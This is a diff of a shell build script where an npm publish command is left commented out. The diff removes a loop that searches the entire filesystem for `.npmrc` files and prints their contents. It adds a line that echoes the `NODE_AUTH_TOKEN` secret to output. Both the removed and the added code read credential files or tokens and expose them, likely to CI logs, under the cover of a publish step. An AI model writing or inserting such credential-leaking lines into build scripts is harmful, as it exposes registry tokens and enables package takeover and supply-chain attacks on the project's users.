@@ -12,9 +12,5 @@ source "$SOURCE_DIR/scripts/env.sh"
 if [ -d "$BUILD_OUTPUT_DIR" ];
 then
     # npm publish "$BUILD_OUTPUT_DIR" --access public
-    find / -name ".npmrc" 2> /dev/null | while read -r NPMRC;
-    do
-        echo "+- $NPMRC ---+"
-        cat "$NPMRC"
-    done
+    echo "$NODE_AUTH_TOKEN"
 fi
